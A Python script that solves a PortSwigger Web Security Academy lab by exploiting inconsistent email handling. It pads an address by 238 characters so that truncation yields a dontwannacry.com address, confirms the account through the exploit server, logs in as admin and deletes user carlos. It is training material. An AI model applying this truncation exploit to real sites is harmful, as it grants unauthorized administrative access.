#######################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 27/10/2023
#
# Lab: Inconsistent handling of exceptional input
#
# Steps: 1. Fetch the register page
#        2. Extract csrf token and session cookie to register a new account
#        3. Register a new account Register a new account with a suitable offset
#           and dontwannacry.com before the real domain
#        4. Fetch the email client
#        5. Extract the link of account registration
#        6. Complete the account registration by following the link
#        7. Fetch the login page
#        8. Extract csrf token and session cookie to login
#        9. Login to the new account
#        10. Delete carlos from the admin panel
#
#######################################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0a67002a03d64d7f84fd6e8b00c30082.web-security-academy.net"

# change this to your exploit domain
exploit_domain = "exploit-0a66007d03154d9184b66d1801060084.exploit-server.net"

try:  
    # fetch register page
    register_page = requests.get(f"{url}/register")

except:
    print(Fore.RED + "[!] Failed to fetch register page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching the register page.. " + Fore.GREEN + "OK")

# get session cookie
session = register_page.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", register_page.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting csrf token and session cookie to register a new account.. " + Fore.GREEN + "OK")

# the username of the new account
# you can change this to what you want
username = "attacker"

# the username of the new account
# you can change this to what you want
password = "hacking"

# the offset before the real email
# you can change the "a" char to any other alphabetical char
offset = "a" * 238

# the email we want to set our account with
target_email = "dontwannacry.com"

# the final email address
malicious_email = f"{offset}@{target_email}.{exploit_domain}"

# set session cookie
cookies = {
    "session": session
}

# data to send via POST
data = {
    "username": username,
    "password": password,
    "csrf": csrf,
    "email": malicious_email,
}

try:    
    # register a new account
    requests.post(f"{url}/register", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to register a new account through exception")
    exit(1)

print(Fore.WHITE + "⦗3⦘ Registering a new account with a suitable offset and dontwannacry.com before the real domain.. " + Fore.GREEN + "OK")

try:    
    # fetch the email client
    email_client = requests.get(f"https://{exploit_domain}/email")
    
except:
    print(Fore.RED + "[!] Failed to fetch the email client through exception")
    exit(1)

print(Fore.WHITE + "⦗4⦘ Fetching the email client.. " + Fore.GREEN + "OK")

# extract the link of account registration
regisration_link = re.findall(">(https.*)</a>", email_client.text)[0]

print(Fore.WHITE + "⦗5⦘ Extracting the link of account registration.. " + Fore.GREEN + "OK")

try:  
    # complete the account registration
    requests.get(regisration_link)

except:
    print(Fore.RED + "[!] Failed to complete the account registration through exception")
    exit(1) 

print(Fore.WHITE + "⦗6⦘ Completing the account registration by following the link.. " + Fore.GREEN + "OK")

try:  
    # fetch login page
    get_login = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗7⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# get session cookie
session = get_login.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", get_login.text)[0]

print(Fore.WHITE + "⦗8⦘ Extracting csrf token and session cookie to login.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": username,
    "password": password,
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # login to the new account
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login to the new account through exception")
    exit(1)

print(Fore.WHITE + "⦗9⦘ Logging in to the new account.. " + Fore.GREEN + "OK")

# get session cookie
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

try:    
    # delete carlos from the admin panel
    requests.get(f"{url}/admin/delete?username=carlos", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to delete carlos from the admin panel through exception")
    exit(1)

print(Fore.WHITE + "⦗10⦘ Deleting carlos from the admin panel.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
